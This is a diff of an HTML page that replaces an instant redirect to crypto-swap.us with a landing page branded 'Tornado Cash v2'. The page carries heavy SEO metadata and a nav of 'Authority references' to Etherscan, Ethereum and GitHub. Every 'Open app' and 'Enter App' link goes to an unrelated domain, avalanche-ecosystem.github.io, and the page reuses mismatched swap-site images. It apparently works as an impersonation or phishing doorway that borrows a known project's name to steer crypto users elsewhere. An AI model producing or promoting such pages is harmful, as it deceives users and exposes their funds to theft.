@@ -1,11 +1,120 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta http-equiv="refresh" content="0;url=https://crypto-swap.us/">
-  <script>
-    location.replace("https://crypto-swap.us/");
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tornado Cash v2</title>
+  <meta name="description" content="Tornado Cash v2 is an informational entry point for the Tornado Cash interface on Ethereum.">
+  <link rel="canonical" href="https://tornadocash-v2.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Tornado Cash v2">
+  <meta property="og:description" content="Tornado Cash v2 is an informational entry point for the Tornado Cash interface on Ethereum.">
+  <meta property="og:url" content="https://tornadocash-v2.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Tornado Cash v2">
+  <meta name="twitter:description" content="Tornado Cash v2 is an informational entry point for the Tornado Cash interface on Ethereum.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://tornadocash-v2.github.io/#website",
+        "url": "https://tornadocash-v2.github.io/",
+        "name": "Tornado Cash v2",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://tornadocash-v2.github.io/#app",
+        "name": "Tornado Cash v2",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://tornadocash-v2.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://tornadocash-v2.github.io/#organization",
+        "name": "Tornado Cash",
+        "url": "https://github.com/tornadocash",
+        "logo": "https://tornadocash-v2.github.io/favicon.png"
+      }
+    ]
+  }
   </script>
 </head>
-<body></body>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Tornado Cash v2 home">
+      <img src="simpleswap.png" width="30" height="30" alt="">
+      <span>Tornado Cash</span>
+    </a>
+
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/en/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
+      <a href="https://github.com/tornadocash" target="_blank" rel="nofollow noopener noreferrer">GitHub</a>
+    </nav>
+
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Tornado Cash v2">
+      <h1>Tornado Cash v2</h1>
+      <p class="value"><strong>Tornado Cash v2</strong> presents the Tornado Cash interface for Ethereum privacy tooling.</p>
+    </section>
+
+    <section class="app-card" aria-label="Interface overview">
+      <div class="route">
+        <div class="leg">
+          <span class="label">Interface</span>
+          <span class="chip">
+            <img src="btc.png" width="28" height="28" alt="">
+            <span>Deposit</span>
+          </span>
+        </div>
+
+        <button class="switch" type="button" data-switch aria-label="Switch interface view">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+
+        <div class="leg">
+          <span class="label">Reference</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="">
+            <span>Withdraw</span>
+          </span>
+        </div>
+      </div>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">Tornado Cash v2 &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  }());
+  </script>
+</body>
 </html>
